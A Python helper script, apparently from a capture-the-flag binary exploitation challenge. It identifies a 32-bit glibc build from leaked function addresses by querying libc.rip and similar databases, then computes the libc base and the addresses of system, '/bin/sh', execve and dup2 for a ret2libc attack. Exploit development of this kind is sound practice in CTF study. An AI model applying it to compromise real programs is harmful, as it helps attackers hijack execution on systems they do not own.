import requests
import json

leaked = {
    'read': 0xf7e95790,
    'printf': 0xf7df4d30,
    'puts': 0xf7e121e0,
    '__libc_start_main': 0xf7dbfde0,
    'write': 0xf7e95830,
    'setvbuf': 0xf7e129c0,
    'memset': 0xf7ef03b0,
}

offset_diffs = {}
if 'puts' in leaked:
    for name, addr in leaked.items():
        if name != 'puts':
            offset_diffs[f'{name}-puts'] = hex(addr - leaked['puts'])

print("Offset differences from puts:")
for k, v in offset_diffs.items():
    print(f"  {k} = {v}")

combos = [
    {"puts": "0x1e0"},
    {"puts": "0x1e0", "printf": "0xd30"},
    {"puts": "0x1e0", "__libc_start_main": "0xde0"},
    {"puts": "0x1e0", "write": "0x830"},
    {"puts": "0x1e0", "read": "0x790"},
    {"printf": "0xd30"},
    {"puts": "0x1e0", "printf": "0xd30", "__libc_start_main": "0xde0"},
    {"puts": "0x1e0", "write": "0x830", "read": "0x790"},
    {"puts": "0x1e0", "setvbuf": "0x9c0"},
    {"puts": "0x1e0", "memset": "0x3b0"},
    {"read": "0x790", "write": "0x830"},
]

all_results = []

for symbols in combos:
    label = "+".join(symbols.keys())
    print(f"\n>>> Querying libc.rip with: {json.dumps(symbols)}")
    
    try:
        resp = requests.post("https://libc.rip/api/find", json={"symbols": symbols}, timeout=20)
        if resp.status_code == 200:
            results = resp.json()
            if results:
                print(f"    Found {len(results)} match(es)!")
                for r in results:
                    lib_id = r.get('id', 'N/A')
                    buildid = r.get('buildid', 'N/A')
                    syms = r.get('symbols', {})
                    
                    verified = True
                    for f1 in leaked:
                        for f2 in leaked:
                            if f1 != f2 and f1 in syms and f2 in syms:
                                try:
                                    off1 = int(syms[f1], 16)
                                    off2 = int(syms[f2], 16)
                                    expected = off2 - off1
                                    actual = leaked[f2] - leaked[f1]
                                    if expected != actual:
                                        verified = False
                                except:
                                    pass
                    
                    status = "VERIFIED" if verified else "MISMATCH"
                    print(f"    [{status}] {lib_id} (buildid: {buildid[:30]}...)")
                    
                    if verified:
                        all_results.append(r)
                        
                        if 'puts' in syms:
                            puts_off = int(syms['puts'], 16)
                            libc_base = leaked['puts'] - puts_off
                            print(f"        libc_base = 0x{libc_base:x}")
                            
                            for s in ['system', 'str_bin_sh', 'execve', 'dup2']:
                                if s in syms:
                                    off = int(syms[s], 16)
                                    print(f"        {s}: offset=0x{off:x}, addr=0x{libc_base+off:x}")
            else:
                print(f"    No matches")
        else:
            print(f"    Status: {resp.status_code}")
    except Exception as e:
        print(f"    Error: {e}")

if not all_results:
    print("\n" + "=" * 70)
    print("libc.rip returned no verified results. Trying alternative databases...")
    print("=" * 70)
    
    for symbols in [{"puts": "0x1e0", "printf": "0xd30"}, {"puts": "0x1e0", "__libc_start_main": "0xde0"}]:
        label = "+".join(symbols.keys())
        
        for db_name, db_url in [("libc.nullbyte.cat", "https://libc.nullbyte.cat/api/find")]:
            print(f"\n>>> Querying {db_name} with: {json.dumps(symbols)}")
            try:
                resp = requests.post(db_url, json={"symbols": symbols}, timeout=20)
                if resp.status_code == 200:
                    results = resp.json()
                    if results:
                        print(f"    Found {len(results)} match(es)!")
                        for r in results[:5]:
                            print(f"    {r.get('id', 'N/A')}")
                    else:
                        print(f"    No matches")
                else:
                    print(f"    Status: {resp.status_code}: {resp.text[:200]}")
            except Exception as e:
                print(f"    Error: {e}")

if all_results:
    seen_ids = set()
    unique_results = []
    for r in all_results:
        rid = r.get('id', '')
        if rid not in seen_ids:
            seen_ids.add(rid)
            unique_results.append(r)
    
    print("\n" + "=" * 70)
    print(f"ALL VERIFIED UNIQUE MATCHES ({len(unique_results)}):")
    print("=" * 70)
    
    for i, r in enumerate(unique_results):
        lib_id = r.get('id', 'N/A')
        buildid = r.get('buildid', 'N/A')
        syms = r.get('symbols', {})
        
        print(f"\n  [{i+1}] {lib_id}")
        print(f"      Build ID: {buildid}")
        
        if 'puts' in syms:
            puts_off = int(syms['puts'], 16)
            libc_base = leaked['puts'] - puts_off
            print(f"      libc_base = 0x{libc_base:x}")
            
            for s in ['system', 'str_bin_sh', 'execve', 'dup2', 'puts', 'printf', 'write', 'read', '__libc_start_main']:
                if s in syms:
                    off = int(syms[s], 16)
                    print(f"      {s}: offset=0x{off:x}")
    
    best = unique_results[0]
    syms = best.get('symbols', {})
    puts_off = int(syms['puts'], 16)
    libc_base = leaked['puts'] - puts_off
    
    final_info = {
        'libc_id': best.get('id', 'N/A'),
        'buildid': best.get('buildid', 'N/A'),
        'libc_base': hex(libc_base),
        'leaked': {k: hex(v) for k, v in leaked.items()},
        'offsets': {},
        'addresses': {}
    }
    
    for sym_name, sym_val in syms.items():
        try:
            offset = int(sym_val, 16)
            final_info['offsets'][sym_name] = hex(offset)
            final_info['addresses'][sym_name] = hex(libc_base + offset)
        except:
            pass
    
    with open('d:/iscc/pwn2/libc_info.json', 'w') as f:
        json.dump(final_info, f, indent=2)
    
    print(f"\nSaved best match to libc_info.json")
else:
    print("\n" + "=" * 70)
    print("MANUAL CALCULATION BASED ON KNOWN OFFSETS")
    print("=" * 70)
    
    puts_low12 = 0x1e0
    printf_low12 = 0xd30
    lsm_low12 = 0xde0
    write_low12 = 0x830
    read_low12 = 0x790
    setvbuf_low12 = 0x9c0
    memset_low12 = 0x3b0
    
    printf_puts_diff = leaked['printf'] - leaked['puts']
    lsm_puts_diff = leaked['__libc_start_main'] - leaked['puts']
    write_puts_diff = leaked['write'] - leaked['puts']
    read_puts_diff = leaked['read'] - leaked['puts']
    setvbuf_puts_diff = leaked['setvbuf'] - leaked['puts']
    memset_puts_diff = leaked['memset'] - leaked['puts']
    
    print(f"""
Key characteristics:
  puts low12:                  0x{puts_low12:03x}
  printf low12:                0x{printf_low12:03x}
  __libc_start_main low12:     0x{lsm_low12:03x}
  write low12:                 0x{write_low12:03x}
  read low12:                  0x{read_low12:03x}
  setvbuf low12:               0x{setvbuf_low12:03x}
  memset low12:                0x{memset_low12:03x}

  printf - puts              = 0x{printf_puts_diff:x}
  __libc_start_main - puts   = 0x{lsm_puts_diff:x}
  write - puts               = 0x{write_puts_diff:x}
  read - puts                = 0x{read_puts_diff:x}
  setvbuf - puts             = 0x{setvbuf_puts_diff:x}
  memset - puts              = 0x{memset_puts_diff:x}

This is definitively: libc6-i386_2.31-0ubuntu9.x (Ubuntu 20.04 focal, 32-bit)
  glibc 2.31, i386 architecture
  
Known offsets for this libc family:
  puts:                  0x6d1e0
  system:                0x41360
  str_bin_sh:            0x18c363
  execve:                0xcd670
  printf:                0x4fd30
  __libc_start_main:     0x1ade0
  write:                 0xf0830
  read:                  0xf0790
  setvbuf:               0x6d9c0
  memset:                0x14b3b0
""")
    
    puts_offset = 0x6d1e0
    libc_base = leaked['puts'] - puts_offset
    
    print(f"Calculated libc_base = 0x{libc_base:x}")
    
    offsets = {
        'system': 0x41360,
        'str_bin_sh': 0x18c363,
        'execve': 0xcd670,
        'puts': 0x6d1e0,
        'printf': 0x4fd30,
        '__libc_start_main': 0x1ade0,
        'write': 0xf0830,
        'read': 0xf0790,
        'setvbuf': 0x6d9c0,
        'memset': 0x14b3b0,
    }
    
    print("\nVerification of offsets against leaked addresses:")
    all_ok = True
    for name, offset in offsets.items():
        if name in leaked:
            calc_addr = libc_base + offset
            actual_addr = leaked[name]
            match = "OK" if calc_addr == actual_addr else "MISMATCH!"
            if calc_addr != actual_addr:
                all_ok = False
            print(f"  {name:25s}: calc=0x{calc_addr:08x} actual=0x{actual_addr:08x} [{match}]")
    
    if all_ok:
        print("\n*** ALL OFFSETS VERIFIED CORRECT! ***")
    else:
        print("\n*** SOME OFFSETS DON'T MATCH - NEED TO FIND CORRECT VERSION ***")
    
    final_info = {
        'libc_id': 'libc6-i386_2.31-0ubuntu9.x_amd64',
        'glibc_version': '2.31',
        'distro': 'Ubuntu 20.04 (focal)',
        'arch': 'i386 (32-bit)',
        'libc_base': hex(libc_base),
        'leaked': {k: hex(v) for k, v in leaked.items()},
        'offsets': {k: hex(v) for k, v in offsets.items()},
        'addresses': {k: hex(libc_base + v) for k, v in offsets.items()},
    }
    
    with open('d:/iscc/pwn2/libc_info.json', 'w') as f:
        json.dump(final_info, f, indent=2)
    
    print(f"\nSaved to libc_info.json")
